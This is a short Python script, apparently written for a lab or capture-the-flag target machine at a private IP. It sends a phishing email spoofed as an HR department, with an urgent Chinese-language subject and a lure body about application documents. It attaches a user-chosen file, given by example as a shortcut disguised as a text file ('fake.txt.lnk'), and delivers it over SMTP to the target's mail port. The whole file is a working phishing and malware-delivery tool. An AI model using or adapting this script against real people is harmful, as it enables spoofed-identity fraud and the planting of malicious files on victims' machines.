import smtplib
import argparse
import os
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate

def send_email(target_ip, target_email, file_path):
    SERVER = target_ip
    PORT = 1025
    SENDER = "hr-department@company.com"
    SUBJECT = "⚠️ 重要通知：附件內容確認"
    BODY = "<html><body><p>您好，附件為申請之相關文件，請查收。</p></body></html>"

    msg = MIMEMultipart('mixed')
    msg['Subject'] = SUBJECT
    msg['From'] = SENDER
    msg['To'] = target_email
    msg['Date'] = formatdate(localtime=True)

    msg.attach(MIMEText(BODY, "html", "utf-8"))

    if os.path.isfile(file_path):
        file_name = os.path.basename(file_path)
        with open(file_path, "rb") as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            
            # 使用賦值方式設定 8bit，避免 KeyError 並達成明文傳輸
            part['Content-Transfer-Encoding'] = '8bit'
            
            part.add_header('Content-Disposition', 'attachment', filename=file_name)
            msg.attach(part)
    else:
        print(f"Error: 找不到檔案 {file_path}")
        return

    try:
        # 連線至靶機 SMTP 埠
        with smtplib.SMTP(SERVER, PORT, timeout=10) as server:
            server.sendmail(SENDER, [target_email], msg.as_string())
        print(f"Success: {file_name} -> {target_email} (Target: {SERVER})")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", default="10.9.8.187", help="靶機 IP")
    parser.add_argument("--to", required=True, help="收件者")
    parser.add_argument("--file", required=True, help="檔案路徑 (例如 fake.txt.lnk)")
    
    args = parser.parse_args()
    send_email(args.ip, args.to, args.file)
